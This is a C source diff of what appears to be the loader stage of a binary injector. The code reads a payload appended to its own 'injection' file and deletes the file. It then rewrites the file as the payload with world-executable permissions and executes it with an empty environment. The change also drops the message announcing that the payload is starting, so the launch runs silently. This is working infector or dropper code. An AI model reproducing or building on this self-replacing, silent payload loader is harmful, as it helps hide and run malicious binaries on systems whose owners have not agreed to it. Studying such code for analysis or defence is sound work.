@@ -8,40 +8,74 @@
 
 #define PLD_BIN "payload"
 #define IJN_BIN "injection"
-#define IJN_NBYTES 17344
+#define IJN_NBYTES 17464
 #define PLD_NBYTES 20000
+
+char*
+read_payload_binary(ssize_t* nbytes)
+{
+    int fd = open(IJN_BIN, O_RDONLY);
+    if (fd < 0) {
+        fprintf(stderr, "Couldn't open "IJN_BIN".\n");
+        exit(1);
+    }
+
+    lseek(fd, IJN_NBYTES, SEEK_SET);
+
+    char* payload = malloc(PLD_NBYTES);
+    if (payload == NULL) {
+        fprintf(stderr, "Out of memory :'(.\n");
+        exit(1);
+    }
+    *nbytes = read(fd, payload, PLD_NBYTES);
+    if (*nbytes <= 0) {
+        fprintf(stderr, "No payload or failed to read payload.\n");
+        exit(1);
+    }
+    close(fd);
+    return payload;
+}
+
+void
+replace_with_payload(char* payload, ssize_t nbytes_payload)
+{
+    remove(IJN_BIN);
+
+    int fd = creat(IJN_BIN, S_IRWXU | S_IRWXG | S_IRWXO);
+    if (fd < 0) {
+        fprintf(stderr, "Couldn't open "IJN_BIN".\n");
+        exit(1);
+    }
+    close(fd);
+
+    fd = open(IJN_BIN, O_WRONLY);
+    lseek(fd, 0, SEEK_SET);
+    ssize_t bytes_wrote = write(fd, payload, nbytes_payload);
+    if (bytes_wrote <= 0) {
+        fprintf(stderr, "Failed to write the payload.\n");
+        exit(1);
+    }
+    close(fd);
+}
 
 void
 remove_injection_binary(void)
 {
-    // Go to the point where this injection ends
-    int fd = open(IJN_BIN, O_RDONLY);
+    ssize_t nbytes_payload = 0;
 
-    lseek(fd, IJN_NBYTES, SEEK_SET);
+    char* payload = read_payload_binary(&nbytes_payload);
 
-    // Read the rest of the bytes
-    char* program = malloc(PLD_NBYTES);
-    if (program == NULL) {
-        fprintf(stderr, "Out of memory :'(. \n");
-        exit(1);
-    }
-    ssize_t nbytes = read(fd, program, PLD_NBYTES);
+    replace_with_payload(payload, nbytes_payload);
 
-    // Remove the injection binary and create a new file (for some reason it wouldn't work when I
-    // opened the file originally in O_RDWR)
-    close(fd);
-    remove(IJN_BIN);
-    fd = creat(IJN_BIN, S_IRWXU | S_IRWXG | S_IRWXO);
-    close(fd);
-    fd = open(IJN_BIN, O_WRONLY);
+    free(payload);
+}
 
-    // Replace this injection binary with these bytes
-    lseek(fd, 0, SEEK_SET);
-    ssize_t bytes_wrote = write(fd, program, nbytes);
-
-    // Close the file to update the changes
-    close(fd);
-    free(program);
+void
+run_payload(void)
+{
+    char* newargv[] = { NULL };
+    char* newenviron[] = { NULL };
+    execve(IJN_BIN, newargv, newenviron);
 }
 
 int
@@ -51,9 +85,7 @@ main(void)
 
     remove_injection_binary();
 
-    // Execute the payload
-    printf("Starting the payload ... \n\n");
-    char* newargv[] = { NULL };
-    char* newenviron[] = { NULL };
-    execve(IJN_BIN, newargv, newenviron);
+    run_payload();
+
+    exit(1);
 }
